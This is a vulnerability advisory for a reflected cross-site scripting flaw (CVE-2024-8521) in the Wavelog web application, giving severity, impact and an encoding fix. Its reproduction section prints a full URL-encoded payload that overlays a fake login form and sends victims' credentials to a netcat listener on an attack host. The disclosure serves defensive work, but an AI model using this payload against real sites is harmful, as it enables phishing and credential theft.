<!--
<style>
@page {
  size: a4 portrait;
  margin-top: 1.5cm;
  margin-bottom: 1.5cm;
  margin-left: 1cm;
  margin-right: 1cm;
}
</style>
-->
# CVE-2024-8521 - Reflected Cross-Site Scripting (XSS) in Wavelog
### Severity
CVSS v4.0 Score: 5.1 / Medium<br>
Vector String: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
### Weakness Enumeration
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## Affected Versions
Wavelog Version < 1.8.1

## Impact
A reflected cross-site scripting (XSS) vulnerability exists in the Wavelog Web Application. This vulnerability allows the execution of malicious JavaScript within an authenticated user’s browser when they click on a malicious link. As a result, phishing attacks could occur, potentially leading to credential theft.

## Description
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a “trusted” server.

## Recommendation
Encoding should be applied directly before user-controllable data is written to a page. Content placed into HTML needs to be HTML-encoded. To work in all situations, HTML encoding functions should encode the following characters: single and double quotes, backticks, angle brackets, forward and backslashes, equals signs, and ampersands.

<div style="page-break-after: always;"></div>

## Reproduction Steps
To replicate the vulnerability, we can use the Web application's demo site found [here](https://demo.wavelog.org).

1. Login using the credentials `demo:demo`
2. Navigate to QSO > Live QSO or browse directly to `https://demo.wavelog.org/qso?manual=0`
3. Change the value of the query parameter `manual` to make it `https://demo.wavelog.org/qso?manual=alert('xss')`
<div align=center><figure><img src="https://github.com/user-attachments/assets/39244d88-d61a-4e33-b31a-10986942222f" style="width: 100%; max-width: 100%; height: auto;"><figcaption><strong><em>Reflected XSS</em></strong></figcaption></figure></div><br>

So far this is just a self XSS, but we can use this concept to steal the credentials of authenticated users using the web application.

<div style="page-break-after: always;"></div>

## Credential stealing via UI Redressing
1. Start a listener on an attack host (i.e. netcat)<br>
<div align=center><figure><img src="https://github.com/user-attachments/assets/c12941d0-65d7-4abd-b372-78bd7340dff8" alt="Netcat Listener" style="max-width: 100%; height: auto;"><br><figcaption><strong><em>Netcat Listener</em></strong></figcaption></figure></div><br>

2. Send the following payload to the victim user.

<pre style="white-space: pre-wrap;background: #f9f9f9;padding: 1em;border: 1px solid #ddd;border-radius: 4px;">https://demo.wavelog.org/qso?manual=%3Cdiv%20style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Ablack%3Bcolor%3Awhite%3Bz%2Dindex%3A1%22%3E%3Ch1%3EWelcome%20to%20the%20Demo%20of%20Wavelog%3C%2Fh1%3E%3Cp%3EThis%20demo%20will%20be%20reset%20every%20night%20at%200200z%2E%3Cbr%3EMore%20Information%20about%20Wavelog%20on%20Github%2E%3C%2Fp%3E%3Cform%20method%3D%22GET%22%20action%3D%22http%3A%2F%2Flocalhost%3A1111%2F%22%3E%3Cstrong%3EUsername%3C%2Fstrong%3E%3Cinput%20type%3D%22text%22%20name%3D%22user%5Fname%22%3E%3Cbr%3E%3Cstrong%3EPassword%3C%2Fstrong%3E%3Cinput%20type%3D%22password%22%20name%3D%22user%5Fpassword%22%3E%3Cbr%3E%3Cbr%3E%3Cinput%20type%3D%22checkbox%22%3E%3Csmall%3EKeep%20me%20logged%20in%3C%2Fsmall%3E%3Cbr%3E%3Cbutton%20class%3D%22w%2D100%20btn%20btn%2Dprimary%22%20type%3D%22submit%22%3ELogin%20%E2%86%92%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E</pre><br>

When the victim visits the URL, it will present a fake login page.
<div align=center><figure><img src="https://github.com/user-attachments/assets/7a9f5bda-a6eb-48e7-9c70-f0e403245196" alt="XSS UI Redressing" style="width: 100%; max-width: 100%; height: auto;"><figcaption><strong><em>XSS UI Redressing</em></strong></figcaption></figure></div><br>

<div style="page-break-after: always;"></div>

When the credentials are entered and the login button is clicked, the listener on the attack host will capture the credentials.
<div align=center><figure><img src="https://github.com/user-attachments/assets/2d4eee4e-cd8b-4bdc-96b1-25a1ccee9318" alt="Stolen Credentials" style="width: 100%; max-width: 100%; height: auto;"><figcaption><strong><em>Stolen Credentials</em></strong></figcaption></figure></div>

<!--
<br><br><br>
**Title: Reflected Cross-Site Scripting (XSS) in Wavelog**<br>
**Author: Mark Laurence Lat**<br>
**Date: August 6, 2024**
-->
